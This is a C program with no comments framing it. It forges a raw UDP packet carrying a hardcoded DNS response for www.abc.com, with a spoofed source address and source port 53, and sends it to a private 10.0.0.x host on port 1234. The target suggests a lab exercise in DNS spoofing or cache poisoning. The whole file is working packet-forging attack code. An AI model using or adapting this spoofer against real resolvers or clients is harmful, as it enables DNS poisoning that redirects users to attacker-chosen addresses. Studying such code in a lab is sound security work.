#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>


unsigned short checksum(unsigned short *buffer, int size)
{
    unsigned long cksum=0;

    while (size > 1)
    {
        cksum += *buffer++;
  size  -= sizeof(unsigned short);   
    }
    if (size)
    {
        cksum += *(unsigned char *)buffer;   
    }
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >>16);

    return (unsigned short)(~cksum); 
}

void CalculateCheckSum(
    void    *iphdr,
    struct udphdr *udphdr,
    char    *payload,
    int      payloadlen)
{
    struct iphdr  *v4hdr=NULL;
    unsigned long zero=0;
    char          buf[1000],
                 *ptr=NULL;
    int           chksumlen=0,
                  i;
    
    ptr = buf;

    v4hdr = (struct iphdr *)iphdr;

    // Include the source and destination IP addresses
    memcpy(ptr, &v4hdr->saddr,  sizeof(v4hdr->saddr));  
    ptr += sizeof(v4hdr->saddr);
    chksumlen += sizeof(v4hdr->saddr);

    memcpy(ptr, &v4hdr->daddr, sizeof(v4hdr->daddr)); 
    ptr += sizeof(v4hdr->daddr);
    chksumlen += sizeof(v4hdr->daddr);
    
    // Include the 8 bit zero field
    memcpy(ptr, &zero, 1);
    ptr++;
    chksumlen += 1;

    // Protocol
    memcpy(ptr, &v4hdr->protocol, sizeof(v4hdr->protocol)); 
    ptr += sizeof(v4hdr->protocol);
    chksumlen += sizeof(v4hdr->protocol);

    // UDP length
    memcpy(ptr, &udphdr->len, sizeof(udphdr->len)); 
    ptr += sizeof(udphdr->len);
    chksumlen += sizeof(udphdr->len);
    
    // UDP source port
    memcpy(ptr, &udphdr->source, sizeof(udphdr->source)); 
    ptr += sizeof(udphdr->source);
    chksumlen += sizeof(udphdr->source);

    // UDP destination port
    memcpy(ptr, &udphdr->dest, sizeof(udphdr->dest)); 
    ptr += sizeof(udphdr->dest);
    chksumlen += sizeof(udphdr->dest);

    // UDP length again
    memcpy(ptr, &udphdr->len, sizeof(udphdr->len)); 
    ptr += sizeof(udphdr->len);
    chksumlen += sizeof(udphdr->len);
   
    // 16-bit UDP checksum, zero 
    memcpy(ptr, &zero, sizeof(unsigned short));
    ptr += sizeof(unsigned short);
    chksumlen += sizeof(unsigned short);

    // payload
    memcpy(ptr, payload, payloadlen);
    ptr += payloadlen;
    chksumlen += payloadlen;

    // pad to next 16-bit boundary
    for(i=0 ; i < payloadlen%2 ; i++, ptr++)
    {
        printf("pad one byte\n");
        *ptr = 0;
        ptr++;
        chksumlen++;
    }

    // Compute the checksum and put it in the UDP header
    udphdr->check = checksum((unsigned short *)buf, chksumlen);

    return;
}


void main()
{

 int sock;
 unsigned int buffer_size = sizeof(struct iphdr) + sizeof(struct udphdr);

 char DNS_Data[] = "\x71\x79\x81\x80\x00\x01"
                "\x00\x02\x00\x04\x00\x04\x03\x77\x77\x77\x03\x61\x62\x63\x03\x63"
                "\x6f\x6d\x00\x00\x01\x00\x01\xc0\x0c\x00\x05\x00\x01\x00\x00\x02"
                "\xe8\x00\x02\xc0\x10\xc0\x10\x00\x01\x00\x01\x00\x00\x02\xe9\x00"
                "\x04\x0a\xb5\x84\xfa\xc0\x10\x00\x02\x00\x01\x00\x00\xda\xeb\x00"
                "\x0d\x06\x73\x65\x6e\x73\x30\x31\x03\x64\x69\x67\xc0\x14\xc0\x10"
                "\x00\x02\x00\x01\x00\x00\xda\xeb\x00\x09\x06\x73\x65\x6e\x73\x30"
                "\x32\xc0\x4e\xc0\x10\x00\x02\x00\x01\x00\x00\xda\xeb\x00\x09\x06"
                "\x6f\x72\x6e\x73\x30\x31\xc0\x4e\xc0\x10\x00\x02\x00\x01\x00\x00"
                "\xda\xeb\x00\x09\x06\x6f\x72\x6e\x73\x30\x32\xc0\x4e\xc0\x75\x00"
                "\x01\x00\x01\x00\x00\x7a\x36\x00\x04\x0a\xbb\xbd\x2c\xc0\x8a\x00"
                "\x01\x00\x01\x00\x00\x1b\x96\x00\x04\x0a\xbb\xbe\x2c\xc0\x47\x00"
                "\x01\x00\x01\x00\x00\x92\xb1\x00\x04\x0a\xb5\x86\x10\xc0\x60\x00"
                "\x01\x00\x01\x00\x00\x92\xb1\x00\x04\x0a\xb5\x87\xc7";
 
 buffer_size += sizeof(DNS_Data);

 unsigned char buffer[buffer_size];
 memset (buffer, 0, buffer_size);

 struct iphdr *ip = (struct iphdr *)buffer;
 struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct iphdr));

 if ((sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP)) == -1) {

  perror("socket()"); 
  exit(EXIT_FAILURE); 
 }

 int o = 1;
 if (setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&o,sizeof(o)) == -1) {

  perror("setsockopt()"); 
  exit(EXIT_FAILURE); 
 }

 ip->version = 4;
 ip->ihl = 5;
 ip->id = htonl(random());
 ip->saddr = inet_addr("1.0.0.1");
 ip->daddr = inet_addr("10.0.0.63");
 ip->ttl = 255;
 ip->protocol = IPPROTO_UDP;
 ip->tot_len = buffer_size;
 ip->check = 0;

 udp->source = htons(53);
 udp->dest = htons(1234);
 udp->len = htons(buffer_size - sizeof(struct iphdr));
 udp->check = 0;


 struct sockaddr_in addr;
 addr.sin_family = AF_INET;
 addr.sin_port = udp->source;
 addr.sin_addr.s_addr = ip->saddr;

 memcpy(buffer+sizeof(struct iphdr) + sizeof(struct udphdr),DNS_Data,sizeof(DNS_Data)); 
 CalculateCheckSum(ip,udp,DNS_Data,sizeof(DNS_Data));

 if ((sendto(sock, buffer, buffer_size, 0, (struct sockaddr*)&addr,
        sizeof(struct sockaddr_in))) == -1) {

  perror("send()");
  exit(1);
 }
 else
  printf("OK\n");
}